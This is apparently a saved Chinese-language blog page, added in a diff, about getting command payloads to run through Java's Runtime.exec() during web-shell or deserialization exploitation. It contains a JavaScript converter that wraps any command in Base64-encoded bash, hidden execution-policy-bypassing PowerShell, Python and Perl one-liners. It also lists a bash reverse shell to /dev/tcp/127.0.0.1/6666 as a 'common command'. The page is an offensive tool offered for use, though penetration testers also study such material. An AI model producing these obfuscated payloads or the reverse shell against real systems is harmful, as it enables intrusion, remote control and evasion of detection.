@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+<!-- saved from url=(0036)https://www.lintstar.top/shell-java/ -->
+<html lang="zh-CN" data-theme="light">
+
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <link rel="stylesheet" href="./style/index.css">
+
+</head>
+
+<body>
+    <div class="page" id="body-wrap">
+        <header class="not-index-bg" id="page-header">
+            <div id="page-site-info">
+                <h1 id="site-title">java.lang.Runtime.exec（）有效载荷解决方法</h1>
+            </div>
+        </header>
+        <main class="layout" id="content-inner">
+            <div id="page">
+                <div id="article-container">
+
+                    <h1 id="Shell-编码-Java">
+                      <a class="headerlink" title="Shell 编码">
+                      </a>Shell 编码
+                    </h1>
+
+                    <p>
+                      <strong>有时，通过 
+                        <code>Runtime.getRuntime().exec()</code>
+                         执行命令有效负载会导致失败。使用 Web Shell，反序列化利用或通过其他媒介时，可能会发生这种情况。
+                       </strong>
+                     </p>
+                    <p><strong>这是因为重定向和管道字符的使用方式在启动过程的上下文中没有意义。例如，<code>ls &gt; dir_listing</code> 在 shell 中执行应将当前目录的列表输出到名为 <code>dir_listing</code> 的文件中。但是在 <code>exec()</code> 函数的上下文中，该命令将被解释为获取 <code>&gt;</code> 和 <code>dir_listing</code> 目录的列表。</strong></p>
+                    <p><strong>有时，<code>StringTokenizer</code> 类会破坏其中包含空格的参数，该类将命令字符串按空格分隔。诸如此类的东西 <code>ls "My Directory"</code> 将被解释为 <code>ls '"My' 'Directory"'</code>。</strong></p>
+                    <p><strong>借助 Base64 编码，下面的转换器可以帮助减少这些问题。它可以通过调用 Bash 或 PowerShell 来制作管道并重新定向，还可以确保参数内没有空格。</strong></p>
+                    <div class="tab-pane fade" id="exec">
+                        <div class="wrapper wrapper-content">
+                            <div class="row">
+                                <div class="col-md-12 col-lg-12">
+                                    <div class="btn-group btn-group-toggle" data-toggle="buttons">
+                                        <b>Input Type:</b>&nbsp;
+                                        <label class="m-2 btn btn-success active">
+                                            <input type="radio" id="bash-1" name="option" value="bash-1" onclick="processInput();" checked=""> <b>Bash-1</b>&nbsp;
+                                        </label>
+                                        <label class="m-2 btn btn-success">
+                                            <input type="radio" id="bash-2" name="option" value="bash-2" onclick="processInput();"> <b>Bash-2</b>&nbsp;
+                                        </label>
+                                        <label class="m-2 btn btn-danger">
+                                            <input type="radio" id="powershell" name="option" value="powershell" onclick="processInput();"> <b>PowerShell</b>&nbsp;
+                                        </label>
+                                        <label class="m-2 btn btn-warning">
+                                            <input type="radio" id="python" name="option" value="python" onclick="processInput();"> <b>Python</b>&nbsp;
+                                        </label>
+                                        <label class="m-2 btn btn-info">
+                                            <input type="radio" id="perl" name="option" value="perl" onclick="processInput();"> <b>Perl</b>&nbsp;
+                                        </label>
+                                    </div>
+                                    <div class="form-group"><br>
+                                        <textarea class="form-control" id="input" style="margin: 6px;width:600px; height:200px;" placeholder="Type Perl here..."></textarea><br>
+                                        <label for="exampleTextarea"><b>Result:</b></label><br>
+                                        <textarea class="form-control" id="output" style="margin: 6px;width:600px; height:150px;" readonly=""></textarea>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <script>
+                    var taInput = document.querySelector('textarea#input');
+                    var taOutput = document.querySelector('textarea#output');
+
+                    function processInput() {
+                        var option = document.querySelector('input[name="option"]:checked').value;
+
+                        switch (option) {
+                            case 'bash-2':
+                                taInput.placeholder = 'Type Bash here...'
+                                taOutput.value = 'echo ' + btoa(taInput.value) + '|base64 -d|bash -i';
+                                break;
+                            case 'bash-1':
+                                taInput.placeholder = 'Type Bash here...'
+                                taOutput.value = 'bash -c {echo,' + btoa(taInput.value) + '}|{base64,-d}|{bash,-i}';
+                                break;
+                            case 'powershell':
+                                taInput.placeholder = 'Type PowerShell here...'
+                                poshInput = ''
+                                for (var i = 0; i < taInput.value.length; i++) {
+                                    poshInput += taInput.value[i] + unescape("%00");
+                                }
+                                taOutput.value = 'powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc ' + btoa(poshInput);
+                                break;
+                            case 'python':
+                                taInput.placeholder = 'Type Python here...'
+                                taOutput.value = "python -c exec('" + btoa(taInput.value) + "'.decode('base64'))";
+                                break;
+                            case 'perl':
+                                taInput.placeholder = 'Type Perl here...'
+                                taOutput.value = "perl -MMIME::Base64 -e eval(decode_base64('" + btoa(taInput.value) + "'))";
+                                break;
+                            default:
+                                taOutput.value = ''
+                        }
+
+                        if (!taInput.value) taOutput.value = '';
+
+                    }
+
+                    taInput.addEventListener('input', processInput, false);
+                    </script>
+                    <div class="card bg-light">
+                        <div class="card-header">
+                            <h1>常用命令清单</h1>
+                        </div>
+                        <div class="card-body">
+                            <h4>bash -i &gt;&amp; /dev/tcp/127.0.0.1/6666 0&gt;&amp;1</h4>
+                        </div>
+                    </div>
+                </div>
+            </div>
+  </body>
+</html>
